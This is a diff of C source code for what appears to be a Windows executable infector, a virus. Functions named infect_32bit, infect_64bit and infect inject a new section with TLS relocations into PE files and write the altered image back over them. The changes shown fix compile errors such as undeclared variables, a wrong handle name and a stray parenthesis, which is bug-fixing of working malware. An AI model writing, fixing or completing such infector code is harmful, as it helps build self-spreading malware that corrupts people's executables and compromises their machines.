@@ -736,7 +736,7 @@ CVector infect_32bit(InfectorIAT *iat, CVector *module)
    if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
       create_tls_relocations(iat, module, new_section, &new_section_data, FALSE);
 
-   result = cvector_alloc(iat, sizeof(uint8_t), module->elements + new_section_data.elements);
+   CVector result = cvector_alloc(iat, sizeof(uint8_t), module->elements + new_section_data.elements);
    iat->memcpy(result.data, module->data, module->elements);
    iat->memcpy(CVECTOR_CAST(&result, uint8_t *)+module->elements, new_section_data.data, new_section_data.elements);
 
@@ -777,7 +777,7 @@ CVector infect_64bit(InfectorIAT *iat, CVector *module)
    if (nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0)
       create_tls_relocations(iat, module, new_section, &new_section_data, TRUE);
 
-   result = cvector_alloc(iat, sizeof(uint8_t), module->elements + new_section_data.elements);
+   CVector result = cvector_alloc(iat, sizeof(uint8_t), module->elements + new_section_data.elements);
    iat->memcpy(result.data, module->data, module->elements);
    iat->memcpy(CVECTOR_CAST(&result, uint8_t *)+module->elements, new_section_data.data, new_section_data.elements);
 
@@ -979,6 +979,7 @@ int infect(void)
       if (!is_infectable(&iat, &exe_buffer))
          goto free_file;
 
+      PIMAGE_NT_HEADERS32 nt_headers = RECAST(PIMAGE_NT_HEADERS32, CVECTOR_CAST(&exe_buffer, uint8_t *)+CVECTOR_CAST(&exe_buffer, PIMAGE_DOS_HEADER)->e_lfanew);
       CVector rewritten_image;
 
       if (nt_headers->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC)
@@ -994,12 +995,12 @@ int infect(void)
                                   FILE_ATTRIBUTE_NORMAL,
                                   NULL);
 
-      if (infected_handle == INVALID_HANDLE_VALUE)
+      if (exe_handle == INVALID_HANDLE_VALUE)
          goto infected_file_cleanup;
 
       DWORD bytes_written = 0;
 
-      iat.writeFile(exe_handle, rewritten_image.data, rewritten_image.elements, &bytes_written, NULL))
+      iat.writeFile(exe_handle, rewritten_image.data, rewritten_image.elements, &bytes_written, NULL);
       iat.closeHandle(exe_handle);
       exe_handle = INVALID_HANDLE_VALUE;
 
